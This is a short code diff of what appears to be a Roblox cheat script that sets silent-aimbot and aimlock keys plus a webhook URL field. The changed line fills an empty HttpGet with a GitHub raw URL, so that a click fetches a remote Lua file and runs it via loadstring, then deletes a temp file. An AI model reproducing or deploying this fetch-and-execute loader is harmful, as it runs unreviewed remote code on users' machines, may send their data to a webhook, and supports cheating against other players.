@@ -19,7 +19,7 @@ ui.Frame.Load.MouseButton1Click:Connect(function()
         ui.Parent=nil
         getgenv().SilentAimbotKey = 'b'; getgenv().AimlockKey = 'q';  _G.WEBHOOK_URL = ''; -- change this if u want, its just settings
         -- math.random p100 security
-        coroutine.wrap(loadstring(game:HttpGet("")))()
+        coroutine.wrap(loadstring(game:HttpGet("https://raw.githubusercontent.com/machport/Resources/main/assist.lua")))()
         _G.build=nil
         delfile('temp.txt')
     end
